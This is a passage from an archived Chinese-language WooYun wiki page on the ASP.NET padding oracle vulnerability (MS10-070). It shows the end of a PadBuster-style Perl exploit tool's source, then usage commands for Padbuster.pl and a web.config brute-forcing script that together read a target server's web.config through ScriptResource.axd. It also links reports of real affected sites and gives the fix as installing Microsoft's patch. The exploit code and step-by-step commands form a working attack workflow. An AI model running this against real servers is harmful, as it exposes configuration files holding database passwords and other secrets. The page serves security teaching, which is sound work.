 <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
    <span class="co1"># B64</span>
    <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$oper</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">{</span>
 	<span class="re0">$returnVal</span> <span class="sy0">=</span> <span class="re0">&amp;decode_base64</span><span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="br0">)</span><span class="sy0">;</span>
    <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
 	<span class="re0">$returnVal</span> <span class="sy0">=</span> <span class="re0">&amp;encode_base64</span><span class="br0">(</span><span class="re0">$toEncodeDecode</span><span class="br0">)</span><span class="sy0">;</span>
 	<span class="re0">$returnVal</span> <span class="sy0">=~</span> <span class="co2">s/(\r|\n)//g</span><span class="sy0">;</span>	
    <span class="br0">}</span>
 <span class="br0">}</span>
&nbsp;
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$returnVal</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
&nbsp;
<span class="kw2">sub</span> web64Encode <span class="br0">{</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$input</span><span class="sy0">,</span> <span class="re0">$net</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="co1"># net: 0=No Padding Number, 1=Padding (NetUrlToken)</span>
 <span class="re0">$input</span> <span class="sy0">=</span> <span class="re0">&amp;encode_base64</span><span class="br0">(</span><span class="re0">$input</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$input</span> <span class="sy0">=~</span> <span class="co2">s/(\r|\n)//g</span><span class="sy0">;</span>
 <span class="re0">$input</span> <span class="sy0">=~</span> <span class="co2">s/\+/\-/g</span><span class="sy0">;</span>
 <span class="re0">$input</span> <span class="sy0">=~</span> <span class="co2">s/\//\_/g</span><span class="sy0">;</span>
 <span class="kw1">my</span> <span class="re0">$count</span> <span class="sy0">=</span> <span class="re0">$input</span> <span class="sy0">=~</span> <span class="co2">s/\=//g</span><span class="sy0">;</span>
 <span class="re0">$count</span> <span class="sy0">=</span> <span class="nu0">0</span> <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$count</span> <span class="kw1">eq</span> <span class="st0">""</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$input</span><span class="sy0">.=</span><span class="re0">$count</span> <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$net</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$input</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> web64Decode <span class="br0">{</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$input</span><span class="sy0">,</span> <span class="re0">$net</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="co1"># net: 0=No Padding Number, 1=Padding (NetUrlToken)</span>
 <span class="re0">$input</span> <span class="sy0">=~</span> <span class="co2">s/\-/\+/g</span><span class="sy0">;</span>
 <span class="re0">$input</span> <span class="sy0">=~</span> <span class="co2">s/\_/\//g</span><span class="sy0">;</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$net</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">{</span>
  <span class="kw1">my</span> <span class="re0">$count</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chop.html"><span class="kw3">chop</span></a><span class="br0">(</span><span class="re0">$input</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="re0">$input</span> <span class="sy0">=</span> <span class="re0">$input</span><span class="sy0">.</span><span class="br0">(</span><span class="st0">"="</span> x <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/int.html"><span class="kw3">int</span></a><span class="br0">(</span><span class="re0">$count</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="br0">}</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">&amp;decode_base64</span><span class="br0">(</span><span class="re0">$input</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
&nbsp;
<span class="kw2">sub</span> promptUser <span class="br0">{</span>
 <span class="kw1">my</span><span class="br0">(</span><span class="re0">$prompt</span><span class="sy0">,</span> <span class="re0">$default</span><span class="sy0">,</span> <span class="re0">$yn</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="kw1">my</span> <span class="re0">$defaultValue</span> <span class="sy0">=</span> <span class="re0">$default</span> <span class="sy0">?</span> <span class="st0">"[$default]"</span> <span class="sy0">:</span> <span class="st0">""</span><span class="sy0">;</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"$prompt $defaultValue: "</span><span class="sy0">;</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chomp.html"><span class="kw3">chomp</span></a><span class="br0">(</span><span class="kw1">my</span> <span class="re0">$input</span> <span class="sy0">=</span> <span class="re4">&lt;STDIN&gt;</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
 <span class="re0">$input</span> <span class="sy0">=</span> <span class="re0">$input</span> <span class="sy0">?</span> <span class="re0">$input</span> <span class="sy0">:</span> <span class="re0">$default</span><span class="sy0">;</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$yn</span><span class="br0">)</span> <span class="br0">{</span>
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$input</span> <span class="sy0">=~</span> <span class="co2">/^y|n|a$/</span><span class="br0">)</span> <span class="br0">{</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$input</span><span class="sy0">;</span>
  <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
   <span class="re0">&amp;promptUser</span><span class="br0">(</span><span class="re0">$prompt</span><span class="sy0">,</span> <span class="re0">$default</span><span class="sy0">,</span> <span class="re0">$yn</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="br0">}</span>
 <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$input</span> <span class="sy0">=~</span> <span class="co2">/^-?\d/</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$input</span> <span class="sy0">&gt;</span> <span class="nu0">0</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$input</span> <span class="sy0">&lt;</span> <span class="nu0">256</span><span class="br0">)</span> <span class="br0">{</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$input</span><span class="sy0">;</span>
  <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
   <span class="re0">&amp;promptUser</span><span class="br0">(</span><span class="re0">$prompt</span><span class="sy0">,</span> <span class="re0">$default</span><span class="br0">)</span><span class="sy0">;</span>
  <span class="br0">}</span>
 <span class="br0">}</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> writeFile <span class="br0">{</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$fileName</span><span class="sy0">,</span> <span class="re0">$fileContent</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$logFiles</span><span class="br0">)</span> <span class="br0">{</span>
  <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$dirExists</span> <span class="sy0">!=</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">{</span>
   <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/system.html"><span class="kw3">system</span></a><span class="br0">(</span><span class="re0">$dirCmd</span><span class="sy0">.</span><span class="st0">" "</span><span class="sy0">.</span><span class="re0">$dirName</span><span class="br0">)</span><span class="sy0">;</span>
   <span class="re0">$dirExists</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">}</span>
  <span class="re0">$fileName</span> <span class="sy0">=</span> <span class="re0">$dirName</span><span class="sy0">.</span><span class="re0">$dirSlash</span><span class="sy0">.</span><span class="re0">$fileName</span><span class="sy0">;</span>
  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/open.html"><span class="kw3">open</span></a><span class="br0">(</span><span class="kw1">my</span> <span class="re0">$OUTFILE</span><span class="sy0">,</span> <span class="st_h">'&gt;&gt;'</span><span class="sy0">,</span> <span class="re0">$fileName</span><span class="br0">)</span> <span class="kw1">or</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/die.html"><span class="kw3">die</span></a> <span class="st0">"ERROR: Can't write to file $fileName<span class="es0">\n</span>"</span><span class="sy0">;</span>
  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="re0">$OUTFILE</span> <span class="re0">$fileContent</span><span class="sy0">;</span>
  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/close.html"><span class="kw3">close</span></a><span class="br0">(</span><span class="re0">$OUTFILE</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="br0">}</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> getTime <span class="br0">{</span> 
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$format</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
 <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$second</span><span class="sy0">,</span> <span class="re0">$minute</span><span class="sy0">,</span> <span class="re0">$hour</span><span class="sy0">,</span> <span class="re0">$day</span><span class="sy0">,</span> <span class="re0">$month</span><span class="sy0">,</span> <span class="re0">$year</span><span class="sy0">,</span> <span class="re0">$weekday</span><span class="sy0">,</span> <span class="re0">$dayofyear</span><span class="sy0">,</span> <span class="re0">$isDST</span><span class="br0">)</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/localtime.html"><span class="kw3">localtime</span></a><span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/time.html"><span class="kw3">time</span></a><span class="br0">)</span><span class="sy0">;</span>
 <span class="kw1">my</span> <span class="re0">@months</span> <span class="sy0">=</span> <span class="br0">(</span><span class="st0">"JAN"</span><span class="sy0">,</span><span class="st0">"FEB"</span><span class="sy0">,</span><span class="st0">"MAR"</span><span class="sy0">,</span><span class="st0">"APR"</span><span class="sy0">,</span><span class="st0">"MAY"</span><span class="sy0">,</span><span class="st0">"JUN"</span><span class="sy0">,</span><span class="st0">"JUL"</span><span class="sy0">,</span><span class="st0">"AUG"</span><span class="sy0">,</span><span class="st0">"SEP"</span><span class="sy0">,</span><span class="st0">"OCT"</span><span class="sy0">,</span><span class="st0">"NOV"</span><span class="sy0">,</span><span class="st0">"DEC"</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="kw1">my</span> <span class="re0">@days</span> <span class="sy0">=</span> <span class="br0">(</span><span class="st0">"SUN"</span><span class="sy0">,</span><span class="st0">"MON"</span><span class="sy0">,</span><span class="st0">"TUE"</span><span class="sy0">,</span><span class="st0">"WED"</span><span class="sy0">,</span><span class="st0">"THU"</span><span class="sy0">,</span><span class="st0">"FRI"</span><span class="sy0">,</span><span class="st0">"SAT"</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$month</span><span class="sy0">=</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/sprintf.html"><span class="kw3">sprintf</span></a><span class="br0">(</span><span class="st0">"%02d"</span><span class="sy0">,</span><span class="re0">$month</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$day</span><span class="sy0">=</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/sprintf.html"><span class="kw3">sprintf</span></a><span class="br0">(</span><span class="st0">"%02d"</span><span class="sy0">,</span><span class="re0">$day</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$hour</span><span class="sy0">=</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/sprintf.html"><span class="kw3">sprintf</span></a><span class="br0">(</span><span class="st0">"%02d"</span><span class="sy0">,</span><span class="re0">$hour</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$minute</span><span class="sy0">=</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/sprintf.html"><span class="kw3">sprintf</span></a><span class="br0">(</span><span class="st0">"%02d"</span><span class="sy0">,</span><span class="re0">$minute</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$second</span><span class="sy0">=</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/sprintf.html"><span class="kw3">sprintf</span></a><span class="br0">(</span><span class="st0">"%02d"</span><span class="sy0">,</span> <span class="re0">$second</span><span class="br0">)</span><span class="sy0">;</span>
 <span class="re0">$year</span> <span class="sy0">=~</span> <span class="co2">s/^.//</span><span class="sy0">;</span>
 <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$format</span> <span class="kw1">eq</span> <span class="st0">"F"</span><span class="br0">)</span> <span class="br0">{</span>
  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$day</span><span class="sy0">.</span><span class="re0">$months</span><span class="br0">[</span><span class="re0">$month</span><span class="br0">]</span><span class="sy0">.</span><span class="re0">$year</span><span class="sy0">.</span><span class="st0">"-"</span><span class="sy0">.</span><span class="br0">(</span> <span class="br0">(</span><span class="re0">$hour</span> <span class="sy0">*</span> <span class="nu0">3600</span><span class="br0">)</span> <span class="sy0">+</span> <span class="br0">(</span><span class="re0">$minute</span> <span class="sy0">*</span> <span class="nu0">60</span><span class="br0">)</span> <span class="sy0">+</span> <span class="br0">(</span><span class="re0">$second</span><span class="br0">)</span> <span class="br0">)</span><span class="sy0">;</span>
 <span class="br0">}</span> <span class="kw1">elsif</span> <span class="br0">(</span><span class="re0">$format</span> <span class="kw1">eq</span> <span class="st0">"S"</span><span class="br0">)</span> <span class="br0">{</span>
  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$months</span><span class="br0">[</span><span class="re0">$month</span><span class="br0">]</span><span class="sy0">.</span><span class="st0">" "</span><span class="sy0">.</span><span class="re0">$day</span><span class="sy0">.</span><span class="st0">", 20"</span><span class="sy0">.</span><span class="re0">$year</span><span class="sy0">.</span><span class="st0">" at "</span><span class="sy0">.</span><span class="re0">$hour</span><span class="sy0">.</span><span class="st0">":"</span><span class="sy0">.</span><span class="re0">$minute</span><span class="sy0">.</span><span class="st0">":"</span><span class="sy0">.</span><span class="re0">$second</span><span class="sy0">;</span>
 <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="re0">$hour</span><span class="sy0">.</span><span class="st0">":"</span><span class="sy0">.</span><span class="re0">$minute</span><span class="sy0">.</span><span class="st0">":"</span><span class="sy0">.</span><span class="re0">$second</span><span class="sy0">;</span>
 <span class="br0">}</span>
<span class="br0">}</span></pre>

<p>
使用方法
</p>
<pre class="code bash">Padbuster.pl http:<span class="sy0">//</span>www.xxx.com<span class="sy0">/</span>WebResource.axd?<span class="re2">d</span>=XXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXX <span class="nu0">16</span> <span class="re5">-encoding</span> <span class="nu0">3</span> <span class="re5">-plaintext</span> <span class="st0">"|||~/web.config"</span></pre>

<p>
XXXXXXXXXXXXXXXX是<a href="https://web.archive.org/web/20160629065624/http://www.xxx.com/WebResource.axd?d=XXXXXXXXXXXXXXXX" class="urlextern" title="http://www.xxx.com/WebResource.axd?d=XXXXXXXXXXXXXXXX" rel="nofollow">http://www.xxx.com/WebResource.axd?d=XXXXXXXXXXXXXXXX</a>中参数d的值。
16为每个数据块的字节数，分为8和16。encoding参数有4种，分别是0=Base64, 1=Lower HEX, 2=Upper HEX 3=.NET UrlToken, 4=WebSafe Base64。plaintext为想读取内容的文件，本次这里以web.config为例。之后按程序提示进行操作。若网站存在padding oracle漏洞，最终将返回web.config的URL的加密地址。
</p>
<pre class="code bash">Webconfig Bruter.pl http:<span class="sy0">//</span>www.xxx.com<span class="sy0">/</span>ScriptResource.axd XXXXXXXXXXXXXXXXXX <span class="nu0">16</span></pre>

<p>
XXXXXXXXXXXXXXXXXX为Padbuster.pl得到的加密地址。
</p>

<p>
访问
</p>
<pre class="code">http://www.xxx91ri.org/ScriptResource.axd?d=XXXXXXXXXXXXXXXXXX</pre>

<p>
XXXXXXXXXXXXXXXXXX为Webconfig Bruter.pl得到的加密地址。服务器会返回目标文件的内容（此处为web.config文件）。
</p>

</div>

<h3 class="sectionedit5" id="实际案例">4、实际案例</h3>
<div class="level3">
<hr>

<p>
<a href="https://web.archive.org/web/20160629065624/http://www.wooyun.org/bugs/wooyun-2010-052726" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-052726" rel="nofollow">迅雷某分站padding oracle漏洞</a>
</p>

<p>
<a href="https://web.archive.org/web/20160629065624/http://www.wooyun.org/bugs/wooyun-2010-035874" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-035874" rel="nofollow">锐捷某系统padding oraacle漏洞泄露内部数据库密码与web配置信息</a>
</p>

<p>
<a href="https://web.archive.org/web/20160629065624/http://www.wooyun.org/bugs/wooyun-2010-033805" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-033805" rel="nofollow">唯品会某处存在文件读取漏洞（padding oracle实际利用）</a>
</p>

</div>

<h3 class="sectionedit6" id="漏洞修复">5、漏洞修复</h3>
<div class="level3">
<hr>

<p>
安装微软官方补丁。
</p>

</div>

<h3 class="sectionedit7" id="相关资源">6、相关资源</h3>
<div class="level3">
<hr>

<p>
<a href="https://web.archive.org/web/20160629065624/https://technet.microsoft.com/library/security/ms10-070" class="urlextern" title="https://technet.microsoft.com/library/security/ms10-070" rel="nofollow">Microsoft 安全公告 MS10-070 - 重要</a>
</p>

</div>

              <!-- wikipage stop -->

                            
            </div>
          </div>

        </article>

        
      </main>

      <footer id="dokuwiki__footer" class="small hidden-print">

        <a href="javascript:void(0)" class="back-to-top hidden-print btn btn-default btn-sm" title="跳至内容&gt;" id="back-to-top"><i class="glyphicon glyphicon-chevron-up"></i></a>

                <div class="text-center">
          <p id="dw__license">
                      </p>
                  </div>
      </footer>

      
    </div><!-- /site -->

    <div class="no"><img src="./server_padding-oracle-attack [WooYun WiKi]_files/indexer.php" width="2" height="1" alt=""></div>
    <div id="screen__mode" class="no">
      <span class="visible-xs"></span>
      <span class="visible-sm"></span>
      <span class="visible-md"></span>
      <span class="visible-lg"></span>
    </div>
  </div>
  <!--[if ( lte IE 7 | IE 8 ) ]></div><![endif]-->

<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//web.archive.org/web/20160629065624/http://hm.baidu.com/hm.js?2e9369dace9479584f08203285c7cbce";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

</body></html>